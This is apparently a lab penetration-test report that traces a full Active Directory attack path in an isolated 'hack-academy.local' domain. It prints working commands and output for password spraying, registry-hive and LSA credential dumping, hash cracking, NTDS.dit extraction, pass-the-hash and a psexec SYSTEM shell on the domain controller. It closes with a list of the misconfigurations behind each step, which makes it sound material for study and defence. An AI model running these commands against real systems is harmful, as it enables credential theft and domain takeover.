# Active Directory Attack Path – hack-academy.local

## 1. Engagement Overview

This report documents an internal Active Directory penetration test conducted against the `hack-academy.local` domain in an isolated lab environment. The environment consisted of four virtual machines hosted locally on VirtualBox: the attacking workstation (Kali Linux, 10.0.2.15) and three domain-joined hosts:

| Hostname | IP Address | Role | OS |
|---|---|---|---|
| DC01 | 10.0.2.4 | Domain Controller | Windows Server 2022 (Build 20348) |
| CLIENT-1 | 10.0.2.7 | Domain Workstation | Windows 10 (Build 19041) |
| CLIENT-2 | 10.0.2.9 | Domain Workstation | Windows 10 (Build 19041) |

The engagement began with a single set of valid low-privilege domain credentials (`lbennett`), simulating an assumed-breach / initial-access scenario. The objective was to determine whether an attacker starting from this position could escalate privileges and achieve full domain compromise.

The attack path below is presented in the order it was executed, with each phase driven by the findings of the previous one.

---

## 2. Network Reconnaissance

The engagement started with host discovery on the local subnet to identify in-scope systems.

```
ip route
default via 10.0.2.1 dev eth0 proto dhcp src 10.0.2.15 metric 100 
10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100
```

An SMB sweep of the /24 subnet was performed to fingerprint hosts and identify domain membership:

```
netexec smb 10.0.2.0/24
SMB   10.0.2.1   445   DESKTOP-81CPOE0   [*] Windows 11 / Server 2025 Build 26100 x64
SMB   10.0.2.7   445   CLIENT-1          [*] Windows 10 / Server 2019 Build 19041 (domain:hack-academy.local)
SMB   10.0.2.9   445   CLIENT-2          [*] Windows 10 / Server 2019 Build 19041 (domain:hack-academy.local)
SMB   10.0.2.4   445   DC01              [*] Windows Server 2022 Build 20348 (domain:hack-academy.local) (Null Auth:True)
```

This confirmed three hosts belonging to the `hack-academy.local` domain: one Domain Controller and two client workstations. A full TCP port scan (`nmap -A -p- -T4`) was subsequently run against each of the three in-scope hosts.

**Key findings from port scanning:**

- **DC01** exposed the expected Domain Controller service set: Kerberos (88), LDAP (389/3268), SMB (445), WinRM (5985). SMB signing was enforced. Null session authentication was allowed but did not yield actionable information.
- **CLIENT-1** and **CLIENT-2** exposed an identical service profile: SMB (445, signing not enforced), RDP (3389), WinRM (5985). The lack of enforced SMB signing on both workstations was noted as a potential relay vector, though it was not required for the path ultimately taken.

---

## 3. Active Directory Enumeration

Using the supplied credential `lbennett:!!reiD123`, LDAP enumeration was performed to collect data for offline analysis in BloodHound:

```
netexec ldap 10.10.2.4 -u lbennett -p '!!reiD123' --collection All --dns-server 10.10.2.4
```

In parallel, the domain user list was enumerated directly to support a targeted password-spraying effort:

```
netexec ldap 10.0.2.4 -u lbennett -p '!!reiD123' --users
[+] hack-academy.local\lbennett:!!reiD123 
[*] Enumerated 16 domain users: hack-academy.local
...
twest   2025-11-29 15:16:20   HappyCactus$10
```

**Finding – Credential disclosure via account Description field:** the `Description` attribute of the user `twest` contained the value `HappyCactus$10`, a common misconfiguration where administrators store passwords in a user-readable AD attribute. This value was treated as a candidate credential and added to a credential list alongside the initial `lbennett` password.

A clean list of the 16 enumerated usernames was also extracted for use in subsequent spraying:

```
netexec ldap 10.0.2.4 -u lbennett -p '!!reiD123' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
```

---

## 4. Password Policy Review

Before attempting password spraying, the domain password policy was reviewed to assess lockout risk:

```
nxc smb 10.0.2.4 -u lbennett -p '!!reiD123' --pass-pol
...
Account Lockout Threshold: None
```

**Finding – No account lockout policy configured.** With no lockout threshold in place, an aggressive spraying approach (all enumerated usernames against all collected credentials, across all reachable authentication services) could be performed without risk of triggering account lockouts.

---

## 5. Password Spraying

The 16 enumerated usernames were sprayed against the two collected credentials (`lbennett`, `twest`) across SMB, RDP, and WinRM.

**SMB:**
```
netexec smb ips -u users -p passwd --continue-on-success

SMB  10.0.2.9  445  CLIENT-2  [+] hack-academy.local\twest:HappyCactus$10 
SMB  10.0.2.9  445  CLIENT-2  [+] hack-academy.local\lbennett:!!reiD123 
SMB  10.0.2.7  445  CLIENT-1  [+] hack-academy.local\twest:HappyCactus$10
SMB  10.0.2.7  445  CLIENT-1  [+] hack-academy.local\lbennett:!!reiD123
SMB  10.0.2.4  445  DC01      [+] hack-academy.local\twest:HappyCactus$10
SMB  10.0.2.4  445  DC01      [+] hack-academy.local\lbennett:!!reiD123
```

Both credential pairs were confirmed valid domain-wide via SMB, but no administrative access was indicated on any host. The same spray was repeated against RDP with identical results (valid authentication, no elevated access indicated).

**WinRM:**
```
netexec winrm ips -u users -p passwd --continue-on-success

WINRM  10.0.2.7  5985  CLIENT-1  [+] hack-academy.local\twest:HappyCactus$10 (Pwn3d!)
```

**Finding – Local administrative access on CLIENT-1.** The `twest` account was confirmed to hold local administrative privileges on CLIENT-1 via WinRM, providing the initial foothold for the engagement.

---

## 6. Offline Analysis with BloodHound

The collected LDAP data was ingested into BloodHound, and the `twest` and `lbennett` accounts were marked as owned. The following pre-built queries were reviewed:

- **Domain Admins:** in addition to the built-in `Administrator` account, the user `mthompson` was identified as a member of the Domain Admins group. This account showed no distinguishing attributes in prior enumeration and was set as the primary escalation target.
- **Shortest Paths from Owned Objects:** no direct or actionable path was identified from the currently owned principals.
- **Kerberoastable / AS-REP Roastable users:** no results.
- **Principals with DCSync rights:** limited to the default administrative groups; no anomalies.

BloodHound did not surface a direct escalation path from the current position. The identification of `mthompson` as a Domain Admin was retained as the engagement's end goal, and the assessment continued manually from the existing foothold on CLIENT-1.

---

## 7. Initial Foothold and Privilege Escalation – CLIENT-1

An interactive session was established on CLIENT-1 using the `twest` credentials:

```
evil-winrm -i 10.0.2.7 -u twest -p 'HappyCactus$10'
```

A privilege review was performed:

```
whoami /all
...
BUILTIN\Backup Operators
...
SeBackupPrivilege     Enabled
SeRestorePrivilege    Enabled
```

**Finding – Membership in Backup Operators.** The `twest` account was a member of the built-in Backup Operators group, granting `SeBackupPrivilege` and `SeRestorePrivilege`. These privileges allow file-level access that bypasses standard NTFS permissions, and are a well-known vector for extracting registry hives without requiring local administrator rights.

The SAM and SYSTEM hives were saved and exfiltrated for offline processing:

```
mkdir C:\temp
cd C:\temp
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
download system.save
download sam.save
```

The hives were parsed offline:

```
impacket-secretsdump -system system.save -sam sam.save local

Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Matt:1002:...:7facdc498ed1680c4fd1448319a8c04f:::
```

The extracted NT hash for the local account `Matt` was cracked using John the Ripper against the `rockyou.txt` wordlist:

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes_Client-1_10.0.2.7.txt

Password1!    (Matt)
```

**Result:** valid cleartext credentials for the local account `Matt:Password1!`.

---

## 8. Local Privilege Escalation and Persistence – CLIENT-1

The `Matt` credentials were tested across available services and confirmed successful via RDP with administrative indication:

```
netexec rdp ips -u Matt -p Password1! --local-auth --continue-on-success
RDP  10.0.2.7  3389  CLIENT-1  [+] CLIENT-1\Matt:Password1! (Pwn3d!)
```

An interactive RDP session was established, confirming that `Matt` is a member of `BUILTIN\Administrators`:

```
xfreerdp3 /v:10.0.2.7 /u:matt /p:'Password1!' /cert:ignore +clipboard /dynamic-resolution
```

From an elevated PowerShell session, full local administrative control of CLIENT-1 was confirmed. This access was used to establish a more durable and domain-consistent escalation path: rather than relying on the local account `Matt`, the already-controlled domain account `twest` was added to the local Administrators group:

```
net localgroup 'administrators' twest /add
```

This was verified via NetExec:

```
netexec smb ips -u twest -p 'HappyCactus$10'
SMB  10.0.2.7  445  CLIENT-1  [+] hack-academy.local\twest:HappyCactus$10 (Pwn3d!)
```

**Result:** `twest` now holds local administrator rights on CLIENT-1, providing a repeatable, remotely-usable privileged foothold independent of the local `Matt` account.

---

## 9. Credential Harvesting via LSA Secrets

With `twest` confirmed as a local administrator over SMB, remote dumping was performed without requiring an interactive session:

```
netexec smb ips -u twest -p 'HappyCactus$10' --sam
```

This returned the same local hashes previously obtained. LSA secrets were then dumped:

```
netexec smb ips -u twest -p 'HappyCactus$10' --lsa

HACK-ACADEMY.LOCAL/eknight:$DCC2$10240#eknight#e92981e7e9fc7e5732c32865e4c83a8a: (2025-11-29 10:54:13)
```

**Finding – Cached domain credential exposure.** The LSA secrets included a cached domain logon credential (MSCache2/DCC2 format) for the domain user `eknight`, indicating a prior interactive logon by this account on CLIENT-1. The hash was cracked offline:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes_lsa_Client-1_10.0.2.7.txt

!!Stud87    (HACK-ACADEMY.LOCAL/eknight)
```

**Result:** valid domain credentials `eknight:!!Stud87`.

---

## 10. Lateral Movement – CLIENT-2

The newly obtained `eknight` credentials were re-sprayed across the environment:

```
netexec smb ips -u users -p passwd --continue-on-success

SMB  10.0.2.9  445  CLIENT-2  [+] hack-academy.local\eknight:!!Stud87 (Pwn3d!)
```

**Finding – Local administrative access on CLIENT-2.** The `eknight` account was confirmed as a local administrator on CLIENT-2, a host not previously accessed. The same SAM/LSA extraction process used on CLIENT-1 was repeated:

```
netexec smb 10.0.2.9 -u eknight -p '!!Stud87' --sam
```
(no new material – identical local account structure)

```
netexec smb 10.0.2.9 -u eknight -p '!!Stud87' --lsa

HACK-ACADEMY.LOCAL/mthompson:$DCC2$10240#mthompson#364a73de9ce144051ec14a2fdeb6a757: (2025-11-29 22:53:13)
HACK-ACADEMY.LOCAL/eknight:$DCC2$10240#eknight#e92981e7e9fc7e5732c32865e4c83a8a: (2025-11-29 21:52:57)
```

**Finding – Cached credential for the Domain Admin target.** The LSA secrets on CLIENT-2 contained a cached credential for `mthompson`, the account previously identified via BloodHound as a Domain Admin. The hash was cracked offline:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes_lsa_Client-2_10.0.2.9.txt

Password123!!    (HACK-ACADEMY.LOCAL/mthompson)
```

**Result:** valid cleartext credentials for the Domain Admin account, `mthompson:Password123!!`.

---

## 11. Domain Compromise

The `mthompson` credentials were validated against all in-scope hosts, including the Domain Controller:

```
netexec smb ips -u mthompson -p 'Password123!!' --lsa
SMB  10.0.2.4  445  DC01  [+] hack-academy.local\mthompson:Password123!! (Pwn3d!)
```

With confirmed Domain Admin access, a full extraction of the domain credential database (NTDS.dit) was performed:

```
netexec smb ips -u mthompson -p 'Password123!!' --ntds

Administrator:500:...:c0ced2de918b4a7c1b9f4efd225dd503:::
krbtgt:502:...
[+] Dumped 19 NTDS hashes, 16 added to the database
```

**Finding – Full domain credential compromise.** The NT hash of the built-in domain `Administrator` account was obtained (`c0ced2de918b4a7c1b9f4efd225dd503`), enabling authentication via Pass-the-Hash without requiring password cracking:

```
netexec smb 10.0.2.4 -u administrator -H 'c0ced2de918b4a7c1b9f4efd225dd503'
[+] hack-academy.local\administrator:c0ced2de918b4a7c1b9f4efd225dd503 (Pwn3d!)
```

Remote command execution was confirmed:

```
netexec smb 10.0.2.4 -u administrator -H 'c0ced2de918b4a7c1b9f4efd225dd503' -X whoami
hack-academy\administrator
```

An interactive SYSTEM-level shell was then obtained on the Domain Controller:

```
impacket-psexec hack-academy.local/administrator@10.0.2.4 -hashes :c0ced2de918b4a7c1b9f4efd225dd503

C:\Windows\system32> hostname
DC01
C:\Windows\system32> whoami
nt authority\system
```

**Result:** full compromise of the Domain Controller with `NT AUTHORITY\SYSTEM` privileges, representing complete compromise of the `hack-academy.local` domain.

---

## 12. Attack Path Summary

| Step | Action | Credential Used | Outcome |
|---|---|---|---|
| 1 | LDAP enumeration | lbennett | Password disclosed in `twest` account description |
| 2 | Password spraying (WinRM) | lbennett, twest | Local admin on CLIENT-1 as `twest` |
| 3 | BloodHound analysis | – | `mthompson` identified as Domain Admin |
| 4 | SeBackupPrivilege abuse | twest | SAM/SYSTEM hives dumped, local hash of `Matt` |
| 5 | Hash cracking | – | `Matt` credentials recovered (local admin, CLIENT-1) |
| 6 | Group modification | Matt | `twest` added to local Administrators (CLIENT-1) |
| 7 | Remote LSA dump | twest | Cached credential for `eknight` recovered |
| 8 | Hash cracking | – | `eknight` credentials recovered (local admin, CLIENT-2) |
| 9 | Remote LSA dump | eknight | Cached credential for `mthompson` recovered |
| 10 | Hash cracking | – | `mthompson` credentials recovered (Domain Admin) |
| 11 | NTDS extraction | mthompson | NT hash of domain `Administrator` obtained |
| 12 | Pass-the-Hash + PsExec | Administrator (hash) | SYSTEM shell on DC01 |

## 13. Conclusion

Starting from a single low-privilege domain credential, full compromise of the `hack-academy.local` domain was achieved without exploiting any software vulnerability. The attack path relied entirely on credential hygiene failures and privilege misconfigurations that compounded across the environment:

- A password stored in a plaintext-readable AD attribute (`Description`).
- The absence of an account lockout policy, enabling unrestricted password spraying.
- Membership of a standard user account in the **Backup Operators** group, allowing registry hive extraction without local administrator rights.
- Reuse of a single domain account (`twest`) across multiple hosts, which was leveraged as a pivot point once local administrative rights were obtained on one system.
- Cached domain credentials (LSA secrets / DCC2 hashes) left on workstations by prior interactive logons of higher-privileged accounts, including the eventual Domain Admin target.

Each phase of the assessment was directly informed by the output of the previous one: the credential leaked via LDAP enabled the first spray, the resulting foothold enabled privilege abuse, and each successive host compromise surfaced the cached credentials needed to reach the next host ultimately converging on the Domain Admin account that BloodHound had flagged as a target from the earliest stage of the engagement.
